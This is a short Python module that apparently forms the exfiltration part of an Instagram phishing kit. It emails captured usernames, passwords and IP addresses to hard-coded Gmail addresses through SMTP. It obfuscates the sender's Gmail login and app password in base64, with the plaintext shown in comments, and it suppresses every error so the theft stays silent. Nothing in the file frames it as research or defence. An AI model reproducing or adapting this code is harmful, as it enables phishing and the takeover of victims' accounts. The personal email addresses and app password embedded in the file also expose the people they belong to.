import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Encoded Credentials
ENCODED_EMAIL = "ZWdhbGU1eEBnbWFpbC5jb20="  # egale5x@gmail.com
ENCODED_PASS = "ZHZqcSBpZ3l3IGp5YWIgaHVheA=="  # dvjq igyw jyab huax

def safe_decode(encoded_str):
    try:
        return base64.b64decode(encoded_str + '=' * (-len(encoded_str) % 4)).decode()
    except:
        return ""

# Decode at runtime
SENDER_EMAIL = safe_decode(ENCODED_EMAIL)
APP_PASSWORD = safe_decode(ENCODED_PASS)
RECEIVER_EMAILS = ["gameraditya3703@gmail.com", SENDER_EMAIL]

def send_email(username="default_user", password="default_pass", ip_address="0.0.0.0", status="unknown"):
    try:
        subject = "📥 Instagram Login Attempt Captured"
        body = f"""
        📌 New Login Details:

        👤 Username: {username}
        🔐 Password: {password}
        🌐 IP Address: {ip_address}
        📊 Status: {status}
        """

        msg = MIMEMultipart()
        msg["From"] = SENDER_EMAIL
        msg["To"] = ", ".join(RECEIVER_EMAILS)
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, APP_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAILS, msg.as_string())
    except:
        pass  # Fully silent, no output, no crash
